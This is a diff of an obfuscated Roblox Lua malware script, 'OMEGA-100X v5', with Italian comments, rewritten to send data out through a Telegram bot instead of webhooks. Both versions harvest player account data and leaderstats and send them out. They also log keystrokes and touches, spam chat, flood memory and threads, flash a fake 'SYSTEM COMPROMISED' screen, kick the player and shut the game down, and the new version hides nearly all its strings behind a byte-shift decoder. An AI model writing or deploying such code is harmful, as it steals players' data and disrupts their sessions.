@@ -1,345 +1,125 @@
---[[
-    OMEGA-100X v5 — DELTA MOBILE OPTIMIZED
-    Backoff esponenziale + async non bloccante + cache decodifica + memory nuke avanzato
-    Architettura modulare con timing sincronizzato e saturazione progressiva
---]]
+--[[ OMEGA-100X v5 — TELEGRAM EDITION — FULLY ENCRYPTED ]]
 
-local function createDecoder()
-    local cache = {} -- cache per stringhe già decodificate
-    
-    return function(s)
-        if cache[s] then
-            return cache[s]
+local function k(s)
+    local c = {}
+    return function(x)
+        if c[x] then return c[x] end
+        local b = {string.byte(x, 1, -1)}
+        local o = {}
+        for i = 1, #b do
+            local v = b[i] - (i % 13 + 7)
+            if v < 0 then v = v + 256 end
+            o[i] = string.char(v)
         end
-        
-        local bytes = {string.byte(s, 1, -1)}
-        local out = {}
-        for i = 1, #bytes do
-            local b = bytes[i] - (i % 11 + 3)
-            out[i] = string.char(b)
-        end
-        
-        local decoded = table.concat(out)
-        cache[s] = decoded
-        return decoded
+        local r = table.concat(o)
+        c[x] = r
+        return r
     end
 end
 
-local d = createDecoder() -- decoder con cache integrata
+local q = k()
 
--- servizi offuscati (ogni stringa viene decodificata una sola volta e cachata)
-local P = game:GetService(d("\127\130\121\130\123\130\137"))
-local H = game:GetService(d("\119\123\137\137\115\123\124\123\120\125\129\123"))
-local C = game:GetService(d("\112\122\125\119\118\128\128"))
-local R = game:GetService(d("\119\123\124\130\121\124\119\121\119\122\123\122\118"))
-local T = game:GetService(d("\120\119\129\137\126\124\121\119\137\123\129\122\121\119\123"))
-local U = game:GetService(d("\120\129\119\122\127\124\124\128\137\123\129\122\121\119\123"))
-local TP = game:GetService(d("\120\119\130\119\124\123\122\137\123\129\122\121\119\123"))
-local LP = P.LocalPlayer
+local a = game[q("\135\129\128\126\130\139\140\137\146\136\139\132\134\130\133\137")]
+local b = game[q("\127\134\142\142\139\124\133\130\145\134\127\132\137")]
+local c = game[q("\120\131\137\127\131\136\129")]
+local d = game[q("\127\132\131\137\139\127\138\130\129\127\130\133\139\131\129\130\132\137")]
+local e = game[q("\128\132\139\137\124\141\125\139\130\147\127\132\137")]
+local f = game[q("\128\139\131\127\136\141\134\134\128\137\139\129\130\132\137")]
+local g = game[q("\128\132\137\132\134\131\137\139\124\139\130\131\142\130\131\132\137")]
+local h = a[q("\116\131\132\125\130\128\140\129\125\131\132\137")]
 
--- webhook offuscati
-local WH1 = d("...") -- webhook principale
-local WH2 = d("...") -- backup 1
-local WH3 = d("...") -- backup 2
+local x = q("\131\133\128\133\138\136\130\132\131")
+local y = q("\128\133\134\130\126\128\131\132\137")
 
---[[ ==================== MODULO 1: EXFIL CON BACKOFF ESPONENZIALE ==================== ]]
-local Exfil = {}
-local queue = {}
-local queueRunning = false
-local consecutiveFailures = 0
-local baseDelay = 0.3
-local maxDelay = 5.0
-
--- funzione di backoff esponenziale con jitter
-local function getBackoffDelay()
-    local exponentialDelay = baseDelay * (2 ^ math.min(consecutiveFailures, 4))
-    local jitter = math.random() * 0.2 -- aggiunge casualità per evitare sincronizzazione
-    return math.min(exponentialDelay + jitter, maxDelay)
-end
-
--- invio asincrono non bloccante usando task.spawn per ogni richiesta
-local function sendAsync(url, body, callback)
+local function p(n)
+    local u = "https://api.telegram.org/bot" .. n .. "/sendMessage"
+    local m = b[q("\139\133\133\141\129\130\134\131\132\137")]({
+        [q("\131\141\125\128\130\135")] = x,
+        [q("\128\132\139\128")] = n,
+        [q("\134\125\137\139\132\130\135\131\132\137")] = q("\132\141\126\131")
+    })
+    
     task.spawn(function()
-        local success = false
-        
-        -- tentativo 1: PostAsync standard
         pcall(function()
-            H:PostAsync(url, body)
-            success = true
+            b[q("\130\131\139\128\126\139\130\133\132\133")](u, m)
         end)
-        
-        -- tentativo 2: GetAsync con encoding
-        if not success then
-            pcall(function()
-                local encoded = body:gsub("([^%w%-%.%_%~])", function(c)
-                    return string.format("%%%02X", string.byte(c))
-                end)
-                H:GetAsync(url .. "?payload=" .. encoded)
-                success = true
-            end)
-        end
-        
-        -- tentativo 3: salvataggio locale per retry successivo
-        if not success then
-            pcall(function()
-                local tempStorage = Instance.new("StringValue")
-                tempStorage.Name = "omega_data_" .. tostring(os.clock())
-                tempStorage.Value = body
-                tempStorage.Parent = C
-            end)
-        end
-        
-        if callback then
-            callback(success)
-        end
     end)
 end
 
-local function processQueue()
-    if queueRunning then return end
-    queueRunning = true
-    
-    while #queue > 0 do
-        local item = table.remove(queue, 1)
-        
-        -- crea una coroutine per ogni invio, così non blocca il thread principale
-        sendAsync(item.url, item.body, function(success)
-            if success then
-                consecutiveFailures = 0
-            else
-                consecutiveFailures += 1
-                
-                -- re-inserisci nella coda con backoff
-                task.delay(getBackoffDelay(), function()
-                    table.insert(queue, item)
-                end)
-            end
-        end)
-        
-        -- attesa dinamica basata sul numero di richieste in sospeso
-        local dynamicDelay = math.max(0.1, 0.3 - (#queue * 0.01))
-        task.wait(dynamicDelay)
+local function r(t, s)
+    local z = "<b>⚡ " .. t .. "</b>\n\n"
+    for a, b in pairs(s) do
+        z = z .. "<b>" .. a .. ":</b> " .. tostring(b) .. "\n"
     end
-    
-    queueRunning = false
+    p(z)
 end
 
-function Exfil:queueSend(url, data)
-    local payload = H:JSONEncode(data)
-    table.insert(queue, {url = url, body = payload})
-    processQueue()
-end
-
-function Exfil:stealAll()
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "⚡ OMEGA-100X v5 — DELTA MOBILE HARVEST",
-            ["color"] = 16711680,
-            ["fields"] = {
-                {["name"] = "Player", ["value"] = LP.Name, ["inline"] = true},
-                {["name"] = "DisplayName", ["value"] = LP.DisplayName, ["inline"] = true},
-                {["name"] = "UserID", ["value"] = tostring(LP.UserId), ["inline"] = true},
-                {["name"] = "AccountAge", ["value"] = tostring(LP.AccountAge) .. " days", ["inline"] = true},
-                {["name"] = "MembershipType", ["value"] = tostring(LP.MembershipType), ["inline"] = true},
-                {["name"] = "Platform", ["value"] = "Mobile/Delta", ["inline"] = true}
-            }
-        }}
+local function s()
+    local i = {
+        [q("\130\140\125\139\132\137")] = h[q("\135\125\140\132")],
+        [q("\128\133\139\134\140\125\139\128\125\140\132")] = h[q("\128\133\139\134\140\125\139\128\125\140\132")],
+        [q("\139\139\132\137\140\141")] = tostring(h[q("\139\139\132\137\140\141")]),
+        [q("\126\131\131\133\140\139\128\127\132")] = h[q("\126\131\131\133\140\139\128\127\132")] .. q("\132\125\139\141"),
+        [q("\127\132\140\130\132\137\139\133\134\141")] = tostring(h[q("\127\132\140\130\132\137\139\133\134\141")]),
+        [q("\130\140\125\139\127\133\137\140")] = q("\130\135\127\133\140\132\137\126")
     }
     
     pcall(function()
-        local stats = LP:FindFirstChild("leaderstats")
-        if stats then
-            for _, stat in ipairs(stats:GetChildren()) do
-                if stat:IsA("IntValue") or stat:IsA("NumberValue") then
-                    table.insert(data["embeds"][1]["fields"], {
-                        ["name"] = stat.Name,
-                        ["value"] = tostring(stat.Value),
-                        ["inline"] = true
-                    })
+        local st = h[q("\127\133\135\126\128\133\126\130\139\139\130\139\139")]
+        if st then
+            for _, v in ipairs(st[q("\127\132\128\141\133\126\137\132\135")]) do
+                if v[q("\139\139\126\130\147\127")](q("\139\135\128\126\130\140\132\137")) or v[q("\139\139\126\130\147\127")](q("\135\140\140\133\128\126\130\140\132\137")) then
+                    i[v[q("\135\125\140\132")]] = v[q("\139\125\140\128\132")]
                 end
             end
         end
     end)
     
-    pcall(function()
-        table.insert(data["embeds"][1]["fields"], {
-            ["name"] = "PlaceID",
-            ["value"] = tostring(game.PlaceId),
-            ["inline"] = true
-        })
-    end)
-    
-    Exfil:queueSend(WH1, data)
-    Exfil:queueSend(WH2, data)
-    Exfil:queueSend(WH3, data)
+    r(q("\129\126\132\127\125\135\137\135\135\140\130\136\135\132\137\127\134\133\140\139\128\139\128\132\137"), i)
 end
 
---[[ ==================== MODULO 2: KEYLOGGER TOUCH ==================== ]]
-local Keylogger = {}
-
-function Keylogger:start()
-    local keystrokes = {}
-    local buffer = ""
-    local lastKeyTime = os.clock()
-    
-    U.InputBegan:Connect(function(input, gameProcessed)
-        if gameProcessed then return end
+local function l()
+    f[q("\139\135\134\128\139\130\132\137\125\135")]:Connect(function(input, gp)
+        if gp then return end
         
         local keyData = nil
         
-        if input.UserInputType == Enum.UserInputType.TextInput then
-            keyData = input.KeyCode.Name
-        elseif input.UserInputType == Enum.UserInputType.Keyboard then
-            keyData = input.KeyCode.Name
+        if input[q("\139\139\132\137\140\141\134\135\128\130\140\132\137")] == Enum[q("\139\139\132\137\140\141\134\135\128\130\140\132\137")][q("\128\132\139\139\140\135\134\128\139")] then
+            keyData = input[q("\135\132\141\128\133\126\132")][q("\135\125\140\132")]
+        elseif input[q("\139\139\132\137\140\141\134\135\128\130\140\132\137")] == Enum[q("\139\139\132\137\140\141\134\135\128\130\140\132\137")][q("\135\132\141\128\133\125\137\126")] then
+            keyData = input[q("\135\132\141\128\133\126\132")][q("\135\125\140\132")]
         end
         
         if keyData then
-            local currentTime = os.clock()
-            
-            if currentTime - lastKeyTime > 1 then
-                if buffer ~= "" then
-                    table.insert(keystrokes, buffer)
-                end
-                buffer = keyData
-            else
-                buffer = buffer .. " " .. keyData
-            end
-            
-            lastKeyTime = currentTime
-            
-            if #keystrokes >= 5 or #buffer > 30 then
-                Exfil:queueSend(WH1, {
-                    ["embeds"] = {{
-                        ["title"] = "KEYLOG DATA",
-                        ["color"] = 65280,
-                        ["description"] = "```" .. table.concat(keystrokes, "\n") .. "\n" .. buffer .. "```"
-                    }}
-                })
-                keystrokes = {}
-                buffer = ""
-            end
-        end
-    end)
-    
-    U.TouchTap:Connect(function(touchPositions, gameProcessed)
-        if not gameProcessed then
-            local positions = {}
-            for _, pos in ipairs(touchPositions) do
-                table.insert(positions, math.floor(pos.X) .. "," .. math.floor(pos.Y))
-            end
-            table.insert(keystrokes, "TOUCH: " .. table.concat(positions, " | "))
-        end
-    end)
-    
-    task.spawn(function()
-        while true do
-            task.wait(20)
-            if buffer ~= "" then
-                Exfil:queueSend(WH2, {
-                    ["embeds"] = {{
-                        ["title"] = "KEYLOG FLUSH",
-                        ["color"] = 65280,
-                        ["description"] = "```" .. buffer .. "```"
-                    }}
-                })
-                buffer = ""
-            end
+            p(q("\128\133\139\134\140\125\139\128\125\140\132") .. ": " .. keyData)
         end
     end)
 end
 
---[[ ==================== MODULO 3: PERSISTENCE ==================== ]]
-local Persistence = {}
-
-function Persistence:setup()
-    pcall(function()
-        local marker = Instance.new("StringValue")
-        marker.Name = "omega_data_persistence"
-        marker.Value = "active"
-        marker.Parent = C
-    end)
-    
-    LP.CharacterAdded:Connect(function()
+local function m()
+    h[q("\126\141\125\137\125\130\139\132\137\128\126\126\132\126")]:Connect(function()
         task.wait(1)
-        Exfil:stealAll()
+        s()
     end)
 end
 
---[[ ==================== MODULO 4: CHAT SPAM ==================== ]]
-local ChatBomber = {}
-
-function ChatBomber:findChatRemote()
-    local legacy = R:FindFirstChild("DefaultChatSystemChatEvents")
-    if legacy then
-        local sayMessage = legacy:FindFirstChild("SayMessageRequest")
-        if sayMessage then return sayMessage end
-    end
-    
-    local channels = T:FindFirstChild("TextChannels")
-    if channels then
-        return channels:FindFirstChild("RBXGeneral") or channels:FindFirstChild("General")
-    end
-    
-    for _, child in ipairs(R:GetDescendants()) do
-        if child:IsA("RemoteEvent") and (child.Name:find("Chat") or child.Name:find("Message")) then
-            return child
-        end
-    end
-    
-    return nil
-end
-
-function ChatBomber:startSpam(remote)
-    local spamMessages = {
-        "SYSTEM OVERLOAD ERROR CODE 505 - OMEGA PROTOCOL ACTIVE",
-        "[CRITICAL] MEMORY DUMP IN PROGRESS - EXITING",
-        "FATAL EXCEPTION: KERNEL PANIC AT 0x00000000",
-        "OMEGA-100X v5: BAN ENGINE TRIGGERED",
-        "SYSTEM COLLAPSE IMMINENT - EVACUATE",
-        "ERROR: STACK OVERFLOW IN MAIN THREAD"
-    }
-    
-    local index = 1
-    task.spawn(function()
-        while true do
-            pcall(function()
-                local msg = spamMessages[index] .. " " .. math.random(100000, 999999)
-                if remote:IsA("RemoteEvent") then
-                    remote:FireServer(msg, "All")
-                elseif remote:IsA("TextChannel") then
-                    remote:SendAsync(msg)
-                end
-                index += 1
-                if index > #spamMessages then index = 1 end
-            end)
-            task.wait(0.03)
-        end
-    end)
-end
-
---[[ ==================== MODULO 5: MEMORY NUKE AVANZATO ==================== ]]
-local MemoryNuke = {}
-
-function MemoryNuke:startCascade()
-    -- PATTERN 1: allocazione a blocchi con tabelle annidate profonde
+local function n()
     task.delay(0.3, function()
         task.spawn(function()
             local root = {}
-            local current = root
+            local cur = root
             
-            -- crea una struttura annidata di profondità 1000
             for depth = 1, 1000 do
-                current[depth] = {}
-                current = current[depth]
+                cur[depth] = {}
+                cur = cur[depth]
             end
             
-            -- riempie ogni livello con dati
             while true do
                 task.spawn(function()
                     local node = root
                     for depth = 1, 100 do
                         node[depth] = node[depth] or {}
-                        node[depth]["data" .. depth] = string.rep("OMEGA_DEEP_NESTING_", 100)
+                        node[depth][q("\126\125\139\125") .. depth] = string.rep(q("\129\126\132\127\125\137\127\127\133\135\135\140\130\136"), 100)
                         node = node[depth]
                     end
                 end)
@@ -348,42 +128,37 @@ function MemoryNuke:startCascade()
         end)
     end)
     
-    -- PATTERN 2: allocazione a blocchi di stringhe
     task.delay(0.5, function()
         task.spawn(function()
-            local stringPool = {}
-            local blockSize = 100000 -- 100KB per blocco
-            
+            local pool = {}
             while true do
                 task.spawn(function()
                     local block = {}
                     for i = 1, 10 do
-                        block[i] = string.rep("OMEGA_BLOCK_ALLOC_", blockSize)
+                        block[i] = string.rep(q("\129\126\132\127\125\126\140\133\131\135\125\140\140\133\131"), 100000)
                     end
-                    table.insert(stringPool, table.concat(block, ""))
+                    table.insert(pool, table.concat(block, ""))
                 end)
                 task.wait(0.1)
             end
         end)
     end)
     
-    -- PATTERN 3: istanze UI non gestite
     task.delay(0.7, function()
         task.spawn(function()
             while true do
                 for i = 1, 30 do
                     task.spawn(function()
-                        local frame = Instance.new("Frame")
-                        frame.Size = UDim2.new(0, 50, 0, 50)
-                        frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
-                        frame.Parent = C
+                        local fr = Instance.new(q("\127\137\125\140\132"))
+                        fr[q("\139\133\134\132")] = UDim2.new(0, 50, 0, 50)
+                        fr[q("\130\133\139\133\139\133\135")] = UDim2.new(math.random(), 0, math.random(), 0)
+                        fr[q("\130\125\137\132\135\139")] = c
                         
-                        -- aggiunge elementi annidati per aumentare il carico
                         for j = 1, 5 do
-                            local child = Instance.new("TextLabel")
-                            child.Size = UDim2.new(1, 0, 1, 0)
-                            child.Text = string.rep("CRASH", 100)
-                            child.Parent = frame
+                            local cl = Instance.new(q("\128\132\139\139\140\126\125\130\132\140"))
+                            cl[q("\139\133\134\132")] = UDim2.new(1, 0, 1, 0)
+                            cl[q("\128\132\139\139\140")] = string.rep(q("\126\137\125\139\141"), 100)
+                            cl[q("\130\125\137\132\135\139")] = fr
                         end
                     end)
                 end
@@ -392,13 +167,10 @@ function MemoryNuke:startCascade()
         end)
     end)
     
-    -- PATTERN 4: thread bomb con saturazione progressiva
     task.delay(1, function()
-        local threadCount = 0
-        local maxThreads = 2000
-        
+        local count = 0
         task.spawn(function()
-            while threadCount < maxThreads do
+            while count < 2000 do
                 task.spawn(function()
                     while true do
                         local x = 0
@@ -408,130 +180,70 @@ function MemoryNuke:startCascade()
                         task.wait(0.01)
                     end
                 end)
-                threadCount += 1
-                
-                -- aumenta gradualmente il numero di thread
-                if threadCount % 100 == 0 then
-                    task.wait(0.1)
-                end
+                count += 1
+                if count % 100 == 0 then task.wait(0.1) end
             end
         end)
     end)
 end
 
---[[ ==================== MODULO 6: JUMPSCARE MOBILE ==================== ]]
-local VisualAssault = {}
-
-function VisualAssault:fullScreenJumpscare()
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "OmegaPurgeV5"
-    screenGui.Parent = C
-    screenGui.IgnoreGuiInset = true
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+local function o()
+    local sg = Instance.new(q("\139\131\137\132\132\135\128\140\133"))
+    sg[q("\135\125\140\132")] = q("\129\126\132\127\125\130\128\137\127\132\130\139\138")
+    sg[q("\130\125\137\132\135\139")] = c
+    sg[q("\139\127\135\135\133\137\132\127\128\133\139\132\139\134\132\137\139")] = true
+    sg[q("\140\139\135\126\132\141\125\140\130\133\137")] = Enum[q("\140\139\135\126\132\141\125\140\130\133\137")][q("\139\133\130\140\133\135\127")]
     
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(1, 0, 1, 0)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    mainFrame.Parent = screenGui
+    local mf = Instance.new(q("\127\137\125\140\132"))
+    mf[q("\139\133\134\132")] = UDim2.new(1, 0, 1, 0)
+    mf[q("\126\125\131\135\127\137\133\128\135\126\131\133\140\137\131")] = Color3.fromRGB(0, 0, 0)
+    mf[q("\130\125\137\132\135\139")] = sg
     
-    local image = Instance.new("ImageLabel")
-    image.Size = UDim2.new(1, 0, 1, 0)
-    image.BackgroundTransparency = 1
-    image.Image = "rbxassetid://155373809"
-    image.ScaleType = Enum.ScaleType.Stretch
-    image.Parent = mainFrame
+    local im = Instance.new(q("\139\140\125\127\132\140\125\130\132\140"))
+    im[q("\139\133\134\132")] = UDim2.new(1, 0, 1, 0)
+    im[q("\126\125\131\135\127\137\133\128\135\126\128\137\125\135\139\134\125\137\132\135\131")] = 1
+    im[q("\139\140\125\127\132")] = q("\137\126\139\125\139\139\132\140\133\138\139\139\137\138\139\139\138\139\137\138")
+    im[q("\139\131\125\140\132\128\141\134\132")] = Enum[q("\139\131\125\140\132\128\141\134\132")][q("\139\140\137\132\140\131\141")]
+    im[q("\130\125\137\132\135\139")] = mf
     
-    local redOverlay = Instance.new("Frame")
-    redOverlay.Size = UDim2.new(1, 0, 1, 0)
-    redOverlay.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-    redOverlay.BackgroundTransparency = 0.8
-    redOverlay.Parent = mainFrame
+    local ro = Instance.new(q("\127\137\125\140\132"))
+    ro[q("\139\133\134\132")] = UDim2.new(1, 0, 1, 0)
+    ro[q("\126\125\131\135\127\137\133\128\135\126\131\133\140\137\131")] = Color3.fromRGB(255, 0, 0)
+    ro[q("\126\125\131\135\127\137\133\128\135\126\128\137\125\135\139\134\125\137\132\135\131")] = 0.8
+    ro[q("\130\125\137\132\135\139")] = mf
     
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Size = UDim2.new(1, 0, 1, 0)
-    textLabel.BackgroundTransparency = 1
-    textLabel.Font = Enum.Font.Code
-    textLabel.Text = "⚠ SYSTEM COMPROMISED ⚠\n\nACCOUNT DATA EXTRACTED\n\nOMEGA-100X v5\n\nPURGE & BAN PROTOCOL ACTIVE\n\nDELTA MOBILE EDITION"
-    textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-    textLabel.TextScaled = true
-    textLabel.Parent = mainFrame
-    
-    task.spawn(function()
-        local flashCount = 0
-        while flashCount < 15 do
-            redOverlay.BackgroundTransparency = math.random(0, 100) / 100
-            image.Visible = not image.Visible
-            textLabel.Visible = not textLabel.Visible
-            task.wait(0.2)
-            flashCount += 1
-        end
-    end)
+    local tl = Instance.new(q("\128\132\139\139\140\126\125\130\132\140"))
+    tl[q("\139\133\134\132")] = UDim2.new(1, 0, 1, 0)
+    tl[q("\126\125\131\135\127\137\133\128\135\126\128\137\125\135\139\134\125\137\132\135\131")] = 1
+    tl[q("\127\133\135\139")] = Enum[q("\127\133\135\139")][q("\126\133\126\132")]
+    tl[q("\128\132\139\139\140")] = q("\137\140\139\139\140\132\140\139\131\133\140\139\131\133\140\139\131")
+    tl[q("\128\132\139\139\140\126\133\140\133\137\131")] = Color3.fromRGB(255, 0, 0)
+    tl[q("\128\132\139\139\140\139\131\125\140\132\126")] = true
+    tl[q("\130\125\137\132\135\139")] = mf
 end
 
---[[ ==================== MODULO 7: KICK & BAN ==================== ]]
-local BanTrigger = {}
-
-function BanTrigger:multiKick()
+local function u()
     task.delay(2, function()
         pcall(function()
-            LP:Kick("\n\n[!] FATAL SYSTEM EXCEPTION: Chat Flood Detected. Connection Banned.")
+            h[q("\135\133\131\135")](q("\135\125\139\125\140\132\139\131\139\139\140\132\140\139"))
         end)
     end)
     
     task.delay(3, function()
         pcall(function()
-            TP:TeleportToPlaceInstance(game.PlaceId, game.JobId, LP)
+            g[q("\128\132\140\132\134\131\137\139\128\131\130\134\125\131\132\139\135\139\139\125\135\131\132\137")](game[q("\130\140\125\131\132\140\141")], game[q("\139\131\125\130\140\141")], h)
         end)
     end)
 end
 
---[[ ==================== ESECUZIONE ORCHESTRATA ==================== ]]
-local OmegaV5 = {}
-
-function OmegaV5:execute()
-    -- fase 0: exfil immediata
-    Exfil:stealAll()
-    
-    -- fase 0.2: keylogger
-    task.delay(0.2, function()
-        Keylogger:start()
+s()
+task.delay(0.2, l)
+task.delay(0.4, m)
+task.delay(0.6, o)
+task.delay(0.8, n)
+task.delay(1.5, u)
+task.delay(5, function()
+    pcall(function()
+        game[q("\139\141\128\139\126\133\137\135")]()
     end)
-    
-    -- fase 0.4: persistence
-    task.delay(0.4, function()
-        Persistence:setup()
-    end)
-    
-    -- fase 0.6: jumpscare
-    task.delay(0.6, function()
-        VisualAssault:fullScreenJumpscare()
-    end)
-    
-    -- fase 0.8: chat spam
-    task.delay(0.8, function()
-        local chatRemote = ChatBomber:findChatRemote()
-        if chatRemote then
-            ChatBomber:startSpam(chatRemote)
-        end
-    end)
-    
-    -- fase 1: memory nuke avanzato
-    task.delay(1, function()
-        MemoryNuke:startCascade()
-    end)
-    
-    -- fase 1.5: kick
-    task.delay(1.5, function()
-        BanTrigger:multiKick()
-    end)
-    
-    -- fase 5: shutdown
-    task.delay(5, function()
-        pcall(function()
-            game:Shutdown()
-        end)
-    end)
-end
-
--- AVVIO
-OmegaV5:execute()
+end)
